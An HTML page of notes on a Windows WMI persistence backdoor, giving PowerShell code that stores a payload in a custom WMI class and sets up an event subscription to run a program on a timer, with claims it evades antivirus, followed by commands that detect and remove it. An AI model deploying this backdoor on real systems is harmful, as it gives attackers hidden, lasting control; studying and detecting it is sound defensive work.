<!DOCTYPE html  PUBLIC '-//W3C//DTD XHTML 1.0 Transitional//EN'  'http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd'><html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta content="text/html; charset=utf-8" http-equiv="Content-Type"/>
<title>Basic Backdoor WMI</title>
</head><body>#Data Storage<b><br/>
</b><b>Persistence Payload</b><br/>
$StaticClass = New-Object Management.ManagementClass('root\cimv2', $null, $null)<br/>
$StaticClass.Name = 'Win32_EvilClass'<br/>
$StaticClass.Put()<br/>
$StaticClass.Properties.Add('EvilProperty' , &quot;This is payload&quot;)<br/>
$StaticClass.Put() <br/>
It can be encrypted and saved at this position, decoded when executing to achieve that no file is saved on the drive.<br/>
<br/>
#Modified from https://github.com/pan-unit42/iocs/blob/master/seaduke/decompiled.pyL887<br/>
<b>Program Running Stealthily at regular time (requires admin)</b><br/>
$filterName = 'BotFilter82'<br/>
$consumerName = 'BotConsumer23'<br/>
$exePath = 'C:\Windows\System32\notepad.exe'<br/>
$Query = &quot;SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime &gt;= 200 AND TargetInstance.SystemUpTime &lt; 320&quot;<br/>
<br/>
$WMIEventFilter = Set-WmiInstance -Class __EventFilter -NameSpace &quot;root\subscription&quot; -Arguments @{Name=<br/>
$filterName;EventNameSpace=&quot;root\cimv2&quot;;QueryLanguage=&quot;WQL&quot;;Query=$Query} -ErrorAction Stop<br/>
<br/>
$WMIEventConsumer = Set-WmiInstance -Class CommandLineEventConsumer -Namespace &quot;root\subscription&quot; -Arguments @{Name=$consumerName;ExecutablePath=$exePath;CommandLineTemplate=$exePath}<br/>
<br/>
Set-WmiInstance -Class __FilterToConsumerBinding -Namespace &quot;root\subscription&quot; -Arguments@{Filter=$WMIEventFilter;Consumer=$WMIEventConsumer}<br/>
<br/>
Execute notepad.exe every 60s if SystemUpTime is between 200 and 320 seconds<br/>
Tips<br/>
The stuxnet has already used this backdoor that is implemted through mof.<br/>
Until today many are using this backdoor method.<br/>
AV products wonâ€™t kill this behavior.<br/>
<br/>
<br/>
<b>Detection with WMI<br/>
</b><b>View WMI Event</b>requires admin<br/>
<b>#List Event Filters</b><br/>
Get-WMIObject -Namespace root\Subscription -Class __EventFilter<br/>
<br/>
<b>#List Event Consumers</b><br/>
Get-WMIObject -Namespace root\Subscription -Class __EventConsumer<br/>
<br/>
<b>#List Event Bindings</b><br/>
Get-WMIObject -Namespace root\Subscription -Class __FilterToConsumerBinding<br/>
<br/>
Delete requires admin<br/>
<b>#Filter</b><br/>
Get-WMIObject -Namespace root\Subscription -Class __EventFilter -Filter &quot;Name='BotFilter82'&quot; | Remove-WmiObject -Verbose<br/>
<br/>
<b>#Consumer</b><br/>
Get-WMIObject -Namespace root\Subscription -Class CommandLineEventConsumer -Filter &quot;Name='BotConsumer23'&quot; | Remove-WmiObject -Verbose<br/>
<br/>
<b>#Binding</b><br/>
Get-WMIObject -Namespace root\Subscription -Class __FilterToConsumerBinding -Filter &quot;__Path LIKE '%BotFilter82%'&quot; | Remove-WmiObject -Verbose</body></html>